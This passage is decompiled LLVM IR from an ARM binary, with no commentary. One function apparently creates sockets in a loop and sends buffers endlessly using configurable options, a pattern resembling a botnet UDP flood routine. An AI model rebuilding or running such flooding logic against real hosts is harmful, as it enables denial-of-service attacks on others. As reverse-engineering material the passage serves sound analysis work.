  %v1_9418.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9414

dec_label_pc_9570:                                ; preds = %dec_label_pc_9558, %dec_label_pc_9404
  %v0_9570 = call i32 @function_e0b8()
  %v3_9578 = urem i32 %v0_9570, 65536
  store i32 %v3_919c, i32* %r2.global-to-local, align 4
  %v1_9584 = sub nsw i32 999, %v3_9578
  store i32 %v1_9584, i32* %r3.global-to-local, align 4
  %v1_9588 = load i32, i32* %r4.global-to-local, align 4
  %v9_9588 = icmp eq i32 %v3_919c, %v1_9588
  store i1 %v9_9588, i1* %cpsr_z.global-to-local, align 1
  %v1_958c = trunc i32 %v0_9570 to i16
  %v2_958c = load i32, i32* @r5, align 4
  %v3_958c = add i32 %v2_958c, 4
  %v4_958c = inttoptr i32 %v3_958c to i16*
  store i16 %v1_958c, i16* %v4_958c, align 2
  %v0_9590 = load i32, i32* %r3.global-to-local, align 4
  %v1_9590 = trunc i32 %v0_9590 to i16
  %v2_9590 = load i32, i32* @r6, align 4
  %v3_9590 = add i32 %v2_9590, 4
  %v4_9590 = inttoptr i32 %v3_9590 to i16*
  store i16 %v1_9590, i16* %v4_9590, align 2
  br i1 %v9_9588, label %dec_label_pc_9598, label %dec_label_pc_9570.dec_label_pc_9420_crit_edge

dec_label_pc_9570.dec_label_pc_9420_crit_edge:    ; preds = %dec_label_pc_9570
  %v1_9424.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9420

dec_label_pc_9598:                                ; preds = %dec_label_pc_9570, %dec_label_pc_9414
  %v0_9598 = call i32 @function_e0b8()
  %v1_9598 = trunc i32 %v0_9598 to i16
  store i32 %v3_91a0, i32* %r3.global-to-local, align 4
  %v1_95a0 = load i32, i32* %r4.global-to-local, align 4
  %v9_95a0 = icmp eq i32 %v3_91a0, %v1_95a0
  store i1 %v9_95a0, i1* %cpsr_z.global-to-local, align 1
  %v3_95a4 = load i32, i32* @r5, align 4
  %v4_95a4 = add i32 %v3_95a4, 44
  %v5_95a4 = inttoptr i32 %v4_95a4 to i16*
  store i16 %v1_9598, i16* %v5_95a4, align 2
  br i1 %v9_95a0, label %dec_label_pc_95ac, label %dec_label_pc_942c

dec_label_pc_95ac:                                ; preds = %dec_label_pc_9598, %dec_label_pc_9420
  %v0_95ac = call i32 @function_e0b8()
  %v1_95ac = trunc i32 %v0_95ac to i16
  store i32 %v1_9194, i32* @r4, align 4
  store i1 %v2_95b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95b4, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_95ac
  %v3_95bc31 = load i32, i32* @r7, align 4
  %v4_95bc32 = add i32 %v3_95bc31, 2
  %v5_95bc33 = inttoptr i32 %v4_95bc32 to i16*
  store i16 %v1_95ac, i16* %v5_95bc33, align 2
  br label %dec_label_pc_95c8

bb85:                                             ; preds = %dec_label_pc_95ac
  %v1_95b8 = load i32, i32* @r5, align 4
  %v2_95b8 = add i32 %v1_95b8, 16
  %v3_95b8 = inttoptr i32 %v2_95b8 to i32*
  %v4_95b8 = load i32, i32* %v3_95b8, align 4
  store i32 %v4_95b8, i32* %r3.global-to-local, align 4
  %v3_95bc = load i32, i32* @r7, align 4
  %v4_95bc = add i32 %v3_95bc, 2
  %v5_95bc = inttoptr i32 %v4_95bc to i16*
  store i16 %v1_95ac, i16* %v5_95bc, align 2
  %v1_95c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_95c0 = load i32, i32* @r6, align 4
  %v3_95c0 = add i32 %v2_95c0, 16
  %v4_95c0 = inttoptr i32 %v3_95c0 to i32*
  store i32 %v1_95c0, i32* %v4_95c0, align 4
  br label %dec_label_pc_9440

dec_label_pc_95c8:                                ; preds = %.thread30, %dec_label_pc_942c
  %v0_95c8 = call i32 @function_e0b8()
  store i32 %v1_9108, i32* %r1.global-to-local, align 4
  store i1 %v2_95d0, i1* %cpsr_z.global-to-local, align 1
  %v1_95d4 = load i32, i32* @r6, align 4
  %v2_95d4 = add i32 %v1_95d4, 16
  %v3_95d4 = inttoptr i32 %v2_95d4 to i32*
  store i32 %v0_95c8, i32* %v3_95d4, align 4
  br i1 %v2_95d0, label %dec_label_pc_944c, label %dec_label_pc_95dc

dec_label_pc_95dc:                                ; preds = %dec_label_pc_9440, %dec_label_pc_95c8
  %v0_95dc = load i32, i32* @r7, align 4
  %v1_95dc = add i32 %v0_95dc, 8
  store i32 %v6_90e8, i32* %r1.global-to-local, align 4
  %v2_95e4 = inttoptr i32 %v1_95dc to i16*
  %v3_95e4 = call i32 @function_e24c(i16* %v2_95e4, i32 %v6_90e8)
  br label %dec_label_pc_944c

dec_label_pc_95ec:                                ; preds = %dec_label_pc_9160
  %v1_95f0 = call i32 @function_10ddc(i32 %v3_9150)
  br label %dec_label_pc_95f4

dec_label_pc_95f4:                                ; preds = %dec_label_pc_9000, %dec_label_pc_95ec
  %v1_95fc = phi i32 [ %v3_9150, %dec_label_pc_9000 ], [ %v1_95f0, %dec_label_pc_95ec ]
  store i32 %v3_9000, i32* %r4.global-to-local, align 4
  store i32 %v6_9000, i32* %r5.global-to-local, align 4
  store i32 %v24_9000, i32* %fp.global-to-local, align 4
  ret i32 %v1_95fc

dec_label_pc_9600:                                ; preds = %dec_label_pc_9188
  store i32 %v6_90e8, i32* %r2.global-to-local, align 4
  %v1_9608 = add i32 %v6_90e8, 8
  store i32 %v1_9608, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_93bc.preheader

; uselistorder directives
  uselistorder i32 %v1_9608, { 1, 0 }
  uselistorder i16 %v1_95ac, { 1, 0 }
  uselistorder i32 %v0_9570, { 1, 0 }
  uselistorder i32 %v5_9548, { 1, 0 }
  uselistorder i32 %v0_950c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_94e8, { 1, 2, 0 }
  uselistorder i32 %v1_94e4, { 2, 0, 3, 1 }
  uselistorder i32 %v3_9498, { 1, 0, 2 }
  uselistorder i32 %v0_9480, { 1, 0, 2, 3 }
  uselistorder i32 %v7_93e4, { 1, 0, 2 }
  uselistorder i1 %v7_93fc, { 2, 1, 0 }
  uselistorder i1 %v2_95d0, { 2, 3, 1, 0 }
  uselistorder i1 %v2_95b4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9358, { 1, 0 }
  uselistorder i32 %v4_92cc13, { 1, 0 }
  uselistorder i32 %v3_91f0, { 1, 0 }
  uselistorder i32 %v3_91d4, { 1, 2, 0 }
  uselistorder i32 %v1_91d0, { 1, 0 }
  uselistorder i32 %v1_9194, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9190, { 1, 0, 3, 2 }
  uselistorder i32 %v0_918c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9188, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9180, { 1, 0 }
  uselistorder i1 %v7_9154, { 1, 0 }
  uselistorder i32 %v3_9150, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_913c, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9108, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_90e8, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_909c, { 1, 2, 0 }
  uselistorder i32 %v1_9078, { 3, 2, 1, 0 }
  uselistorder i32 %v6_9070, { 1, 0 }
  uselistorder i32 %v6_9034, { 2, 1, 3, 0 }
  uselistorder i32 %v2_901c, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 26, 25, 27, 28, 30, 29, 31, 32, 34, 33, 36, 35, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_95f4, { 1, 0 }
  uselistorder label %dec_label_pc_95dc, { 1, 0 }
  uselistorder label %dec_label_pc_944c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_93bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93bc.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @function_961c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_961c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_961c = load i32, i32* @r4, align 4
  %v18_961c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_9638 = call i32 @function_1215c(i32 %arg1, i32 4)
  store i32 %v2_9638, i32* @sl, align 4
  %v0_9644 = load i32, i32* @r7, align 4
  %v2_9648 = call i32 @function_1215c(i32 %v0_9644, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_9654 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_9648, i32* @r8, align 4
  %v0_9664 = load i32, i32* @r5, align 4
  %v5_9668 = inttoptr i32 %v0_9654 to i32*
  %v6_9668 = call i32 @function_8570(i32 %v0_9664, i32* %v5_9668, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v3_9670 = urem i32 %v6_9668, 65536
  %v0_9674 = load i32, i32* @r6, align 4
  %v0_967c = load i32, i32* @r4, align 4
  store i32 %v0_967c, i32* %r3.global-to-local, align 4
  %v0_9680 = load i32, i32* @r5, align 4
  %v5_9688 = inttoptr i32 %v0_9674 to i32*
  %v6_9688 = call i32 @function_8570(i32 %v0_9680, i32* %v5_9688, i32 6, i32 %v0_967c, i32 %v3_9670)
  %v0_968c = load i32, i32* @r6, align 4
  %v3_9690 = mul i32 %v6_9688, 65536
  store i32 %v3_9690, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_969c = load i32, i32* @r5, align 4
  %v5_96a0 = inttoptr i32 %v0_968c to i32*
  %v6_96a0 = call i32 @function_8570(i32 %v0_969c, i32* %v5_96a0, i32 0, i32 1024, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96b0 = load i32, i32* @r6, align 4
  %v0_96b4 = load i32, i32* @r5, align 4
  %v3_96b8 = urem i32 %v6_96a0, 65536
  store i32 %v3_96b8, i32* @r5, align 4
  %v5_96bc = inttoptr i32 %v0_96b0 to i32*
  %v6_96bc = call i32 @function_8570(i32 %v0_96b4, i32* %v5_96bc, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_96c0 = load i32, i32* %sb.global-to-local, align 4
  %v3_96c0 = udiv i32 %v0_96c0, 65536
  store i32 %v3_96c0, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_96c8 = load i32, i32* @r4, align 4
  %v9_96c8 = icmp eq i32 %v3_96c0, %v1_96c8
  br i1 %v9_96c8, label %dec_label_pc_96f8, label %bb

bb:                                               ; preds = %dec_label_pc_961c
  store i32 0, i32* %stack_var_-56, align 4
  %v4_96e0 = udiv i32 %v0_96c0, 16777216
  store i32 %v4_96e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9708

dec_label_pc_96f8:                                ; preds = %dec_label_pc_961c
  store i32 0, i32* %stack_var_-56, align 4
  %v0_96f8 = call i32 @function_e0b8()
  br label %dec_label_pc_9708

dec_label_pc_9708:                                ; preds = %bb, %dec_label_pc_96f8
  %v0_96ec10 = urem i32 %v6_96bc, 256
  %v0_9708 = load i32, i32* @r7, align 4
  %v2_9708 = icmp eq i32 %v0_9708, 0
  br i1 %v2_9708, label %dec_label_pc_9848, label %dec_label_pc_9710

dec_label_pc_9710:                                ; preds = %dec_label_pc_9708
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_97bc = udiv i32 %v3_9670, 256
  %v1_97b8 = mul i32 %v6_9668, 256
  %v4_97c0 = and i32 %v1_97b8, 65280
  %v5_97c0 = or i32 %v4_97c0, %v3_97bc
  %v2_9740 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_97a0

dec_label_pc_9720:                                ; preds = %bb51, %dec_label_pc_97e0
  %v3_972c = call i32 @function_115f4(i32 2, i32 2, i32 0)
  %v7_9734 = icmp eq i32 %v3_972c, -1
  %v0_9738 = load i32, i32* @sb, align 4
  %v1_9738 = add i32 %v0_9738, 1
  store i32 %v1_9738, i32* @sb, align 4
  %v0_973c = load i32, i32* @fp, align 4
  %v1_973c = add i32 %v0_973c, 24
  store i32 %v1_973c, i32* @fp, align 4
  %v2_9748 = load i32, i32* @r8, align 4
  %v3_9748 = add i32 %v2_9748, %stack_var_-60.0
  %v4_9748 = inttoptr i32 %v3_9748 to i32*
  store i32 %v3_972c, i32* %v4_9748, align 4
  br i1 %v7_9734, label %dec_label_pc_983c, label %dec_label_pc_9750

dec_label_pc_9750:                                ; preds = %dec_label_pc_9720
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_9768 = call i32 @function_113a4(i32 %v3_972c, i32 %v2_9740, i32 16)
  %v0_976c = load i32, i32* @r6, align 4
  %v1_976c = add i32 %v0_976c, 20
  %v2_976c = inttoptr i32 %v1_976c to i8*
  %v3_976c = load i8, i8* %v2_976c, align 1
  %v4_976c = zext i8 %v3_976c to i32
  store i32 %v4_976c, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_976c, 32
  br i1 %tmp, label %dec_label_pc_97f4, label %dec_label_pc_9778

dec_label_pc_9778:                                ; preds = %dec_label_pc_9750, %dec_label_pc_97f4
  %v0_977c = phi i32 [ %v0_976c, %dec_label_pc_9750 ], [ %v0_977c.pre, %dec_label_pc_97f4 ]
  %v1_9780 = load i32, i32* @r8, align 4
  %v2_9780 = add i32 %v1_9780, %stack_var_-60.0
  %v3_9780 = inttoptr i32 %v2_9780 to i32*
  %v4_9780 = load i32, i32* %v3_9780, align 4
  %v3_9788 = call i32 @function_113dc(i32 %v4_9780, i32 %v0_977c, i32 16)
  %v0_9790 = load i32, i32* @sb, align 4
  %v1_9790 = load i32, i32* @r7, align 4
  %v9_9790 = icmp eq i32 %v0_9790, %v1_9790
  %v1_9794 = add i32 %stack_var_-60.0, 4
  store i32 %v1_9794, i32* %r3.global-to-local, align 4
  br i1 %v9_9790, label %dec_label_pc_9848, label %dec_label_pc_97a0

dec_label_pc_97a0:                                ; preds = %dec_label_pc_9778, %dec_label_pc_9710
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_9710 ], [ %v1_9794, %dec_label_pc_9778 ]
  store i32 65535, i32* @r4, align 4
  %v2_97b0 = call i32 @function_1215c(i32 65535, i32 1)
  store i32 %v5_97c0, i32* %r3.global-to-local, align 4
  %v1_97cc = load i32, i32* @r4, align 4
  %v9_97cc = icmp eq i32 %v3_9670, %v1_97cc
  %v1_97d0 = load i32, i32* @fp, align 4
  %v2_97d0 = add i32 %v1_97d0, %arg2
  store i32 %v2_97d0, i32* @r6, align 4
  %v2_97d4 = load i32, i32* @sl, align 4
  %v3_97d4 = add i32 %v2_97d4, %stack_var_-60.0
  %v4_97d4 = inttoptr i32 %v3_97d4 to i32*
  store i32 %v2_97b0, i32* %v4_97d4, align 4
  br i1 %v9_97cc, label %dec_label_pc_97e0, label %bb51

bb51:                                             ; preds = %dec_label_pc_97a0
  %v1_97d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_97d8 = trunc i32 %v1_97d8 to i16
  %v3_97d8 = load i32, i32* @r6, align 4
  %v4_97d8 = add i32 %v3_97d8, 2
  %v5_97d8 = inttoptr i32 %v4_97d8 to i16*
  store i16 %v2_97d8, i16* %v5_97d8, align 2
  br label %dec_label_pc_9720

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97a0
  %v0_97e0 = call i32 @function_e0b8()
  %v1_97e0 = trunc i32 %v0_97e0 to i16
  %v0_97e8 = load i32, i32* @fp, align 4
  %v2_97e8 = add i32 %v0_97e8, %arg2
  store i32 %v2_97e8, i32* @r6, align 4
  %v4_97ec = add i32 %v2_97e8, 2
  %v5_97ec = inttoptr i32 %v4_97ec to i16*
  store i16 %v1_97e0, i16* %v5_97ec, align 2
  br label %dec_label_pc_9720

dec_label_pc_97f4:                                ; preds = %dec_label_pc_9750
  %v1_97f4 = add i32 %v0_976c, 16
  %v2_97f4 = inttoptr i32 %v1_97f4 to i32*
  %v3_97f4 = load i32, i32* %v2_97f4, align 4
  store i32 %v3_97f4, i32* %r4.global-to-local, align 4
  %v0_97f8 = call i32 @function_e0b8()
  %v1_9808 = and i32 %v3_97f4, 65280
  store i32 %v1_9808, i32* %r3.global-to-local, align 4
  %v0_9810 = load i32, i32* @r6, align 4
  %v1_9810 = add i32 %v0_9810, 20
  %v2_9810 = inttoptr i32 %v1_9810 to i8*
  %v3_9810 = load i8, i8* %v2_9810, align 1
  %v4_9810 = zext i8 %v3_9810 to i32
  %v5_9814 = call i32 @llvm.bswap.i32(i32 %v3_97f4)
  %v7_9818 = lshr i32 %v0_97f8, %v4_9810
  %v8_9818 = add i32 %v7_9818, %v5_9814
  %v5_9830 = call i32 @llvm.bswap.i32(i32 %v8_9818)
  store i32 %v5_9830, i32* %r3.global-to-local, align 4
  %v2_9834 = add i32 %v0_9810, 4
  %v3_9834 = inttoptr i32 %v2_9834 to i32*
  store i32 %v5_9830, i32* %v3_9834, align 4
  %v0_977c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_9778

dec_label_pc_983c:                                ; preds = %dec_label_pc_9720
  store i32 %v3_961c, i32* %r4.global-to-local, align 4
  store i32 %v18_961c, i32* %sb.global-to-local, align 4
  ret i32 %v3_972c

dec_label_pc_9848:                                ; preds = %dec_label_pc_9778, %dec_label_pc_9708
  %v1_988822 = phi i32 [ 0, %dec_label_pc_9708 ], [ %v0_9790, %dec_label_pc_9778 ]
  %v2_984c = icmp eq i32 %v0_96ec10, 0
  br i1 %v2_984c, label %dec_label_pc_986c.outer, label %dec_label_pc_9884

dec_label_pc_985c:                                ; preds = %dec_label_pc_986c
  store i32 %v1_9860, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_985c = load i32, i32* @r8, align 4
  %v4_985c = mul i32 %v1_9860, 4
  %v5_985c = add i32 %v0_985c, %v4_985c
  %v6_985c = inttoptr i32 %v5_985c to i32*
  %v7_985c = load i32, i32* %v6_985c, align 4
  %v0_9860 = load i32, i32* @sl, align 4
  %v5_9860 = add i32 %v0_9860, %v4_985c
  %v6_9860 = inttoptr i32 %v5_9860 to i32*
  %v7_9860 = load i32, i32* %v6_9860, align 4
  %v4_9864 = call i32 @function_11538(i32 %v7_985c, i32 %v7_9860, i32 %v0_9870, i32 16384)
  %v0_9868 = load i32, i32* %r4.global-to-local, align 4
  %v1_9868 = add i32 %v0_9868, 1
  %v0_986c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_986c.outer

dec_label_pc_986c.outer:                          ; preds = %dec_label_pc_9848, %dec_label_pc_985c
  %v0_986c.ph = phi i32 [ %v0_986c.pre.pre, %dec_label_pc_985c ], [ %v1_988822, %dec_label_pc_9848 ]
  %v1_9860.ph = phi i32 [ %v1_9868, %dec_label_pc_985c ], [ 0, %dec_label_pc_9848 ]
  %v0_9870 = load i32, i32* @r5, align 4
  br label %dec_label_pc_986c

dec_label_pc_986c:                                ; preds = %dec_label_pc_986c.outer, %dec_label_pc_986c
  %v1_9860 = phi i32 [ 0, %dec_label_pc_986c ], [ %v1_9860.ph, %dec_label_pc_986c.outer ]
  %v8_9878 = icmp sgt i32 %v0_986c.ph, %v1_9860
  br i1 %v8_9878, label %dec_label_pc_985c, label %dec_label_pc_986c

dec_label_pc_9884:                                ; preds = %dec_label_pc_9888, %dec_label_pc_9848
  %v1_988821 = phi i32 [ %v1_988822, %dec_label_pc_9848 ], [ %v1_9888, %dec_label_pc_9888 ]
  br label %dec_label_pc_9888

dec_label_pc_9888:                                ; preds = %dec_label_pc_9894, %dec_label_pc_9884
  %v1_9888 = phi i32 [ %v1_988821, %dec_label_pc_9884 ], [ %v1_9888.pre, %dec_label_pc_9894 ]
  %v1_9894 = phi i32 [ 0, %dec_label_pc_9884 ], [ %v1_98b4, %dec_label_pc_9894 ]
  store i32 %v1_9894, i32* @r6, align 4
  %v6_9890 = icmp slt i32 %v1_9894, %v1_9888
  br i1 %v6_9890, label %dec_label_pc_9894, label %dec_label_pc_9884

dec_label_pc_9894:                                ; preds = %dec_label_pc_9888
  %v0_988c = load i32, i32* @r5, align 4
  %v0_9894 = load i32, i32* @sl, align 4
  %v4_9894 = mul i32 %v1_9894, 4
  %v5_9894 = add i32 %v0_9894, %v4_9894
  %v6_9894 = inttoptr i32 %v5_9894 to i32*
  %v7_9894 = load i32, i32* %v6_9894, align 4
  store i32 %v7_9894, i32* @r4, align 4
  %v2_989c = inttoptr i32 %v7_9894 to i16*
  %v3_989c = call i32 @function_e24c(i16* %v2_989c, i32 %v0_988c)
  %v0_98a0 = load i32, i32* @r8, align 4
  %v1_98a0 = load i32, i32* @r6, align 4
  %v4_98a0 = mul i32 %v1_98a0, 4
  %v5_98a0 = add i32 %v4_98a0, %v0_98a0
  %v6_98a0 = inttoptr i32 %v5_98a0 to i32*
  %v7_98a0 = load i32, i32* %v6_98a0, align 4
  %v0_98a4 = load i32, i32* @r4, align 4
  %v0_98a8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_98b0 = call i32 @function_11538(i32 %v7_98a0, i32 %v0_98a4, i32 %v0_98a8, i32 16384)
  %v0_98b4 = load i32, i32* @r6, align 4
  %v1_98b4 = add i32 %v0_98b4, 1
  %v1_9888.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_9888

; uselistorder directives
  uselistorder i32 %v1_9888, { 1, 0 }
  uselistorder i32 %v1_9860, { 2, 1, 0 }
  uselistorder i32 %v5_9830, { 1, 0 }
  uselistorder i32 %v3_97f4, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_976c, { 1, 0, 2 }
  uselistorder i32 %v3_972c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_96c0, { 1, 0 }
  uselistorder i32 %v3_9670, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_986c, { 1, 0 }
  uselistorder label %dec_label_pc_986c.outer, { 1, 0 }
  uselistorder label %dec_label_pc_9778, { 1, 0 }
  uselistorder label %dec_label_pc_9720, { 1, 0 }
  uselistorder label %dec_label_pc_9708, { 1, 0 }
}

define i32 @function_98bc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_98bc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_98bc = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_98d8 = call i32 @function_1215c(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_98e4 = load i32, i32* @r6, align 4
  store i32 %v0_98e4, i32* %r0.global-to-local, align 4
  %v2_98e8 = call i32 @function_1215c(i32 %v0_98e4, i32 4)
  %v0_98ec = load i32, i32* @r5, align 4
  store i32 %v0_98ec, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_98fc = load i32, i32* @r4, align 4
  store i32 %v0_98fc, i32* %r0.global-to-local, align 4
  %v5_9900 = inttoptr i32 %v0_98ec to i32*
  %v6_9900 = call i32 @function_8570(i32 %v0_98fc, i32* %v5_9900, i32 2, i32 0, i32 %v2_98e8)
  %v1_990c = urem i32 %v6_9900, 256
  store i32 %v1_990c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9918 = load i32, i32* @r5, align 4
  store i32 %v0_9918, i32* %r1.global-to-local, align 4
  %v0_991c = load i32, i32* @r4, align 4
  store i32 %v0_991c, i32* %r0.global-to-local, align 4
  %v5_9920 = trunc i32 %v6_9900 to i8
  %v6_9924 = inttoptr i32 %v0_9918 to i32*
  %v7_9924 = call i32 @function_8570(i32 %v0_991c, i32* %v6_9924, i32 3, i32 65535, i32 %v6_9900)
  %v0_9928 = load i32, i32* @r5, align 4
  store i32 %v0_9928, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9924, i32* @r7, align 4
  %v0_9938 = load i32, i32* @r4, align 4
  store i32 %v0_9938, i32* %r0.global-to-local, align 4
  %v5_993c = inttoptr i32 %v0_9928 to i32*
  %v6_993c = call i32 @function_8570(i32 %v0_9938, i32* %v5_993c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_9944 = urem i32 %v6_993c, 256
  store i32 %v1_9944, i32* %ip.global-to-local, align 4
  %v0_9948 = load i32, i32* @r5, align 4
  store i32 %v0_9948, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9954 = load i32, i32* @r4, align 4
  store i32 %v0_9954, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_993c, 16777216
  %v5_995c = sdiv i32 %sext, 16777216
  %v6_995c = inttoptr i32 %v0_9948 to i32*
  %v7_995c = call i32 @function_8570(i32 %v0_9954, i32* %v6_995c, i32 5, i32 1, i32 %v5_995c)
  %v1_9968 = urem i32 %v7_995c, 256
  store i32 %v1_9968, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9970 = load i32, i32* @r5, align 4
  store i32 %v0_9970, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_9978 = load i32, i32* @r4, align 4
  store i32 %v0_9978, i32* %r0.global-to-local, align 4
  %v5_9980 = inttoptr i32 %v0_9970 to i32*
  %v6_9980 = call i32 @function_8570(i32 %v0_9978, i32* %v5_9980, i32 7, i32 65535, i32 %v1_9968)
  %v0_9984 = load i32, i32* @r5, align 4
  store i32 %v0_9984, i32* %r1.global-to-local, align 4
  %v3_9988 = mul i32 %v6_9980, 65536
  store i32 %v3_9988, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9994 = load i32, i32* @r4, align 4
  store i32 %v0_9994, i32* %r0.global-to-local, align 4
  %v3_9998 = urem i32 %v6_9980, 65536
  store i32 %v3_9998, i32* @sl, align 4
  %v5_999c = inttoptr i32 %v0_9984 to i32*
  %v6_999c = call i32 @function_8570(i32 %v0_9994, i32* %v5_999c, i32 11, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_99a4 = urem i32 %v6_999c, 256
  store i32 %v1_99a4, i32* %ip.global-to-local, align 4
  %v0_99a8 = load i32, i32* @r5, align 4
  store i32 %v0_99a8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
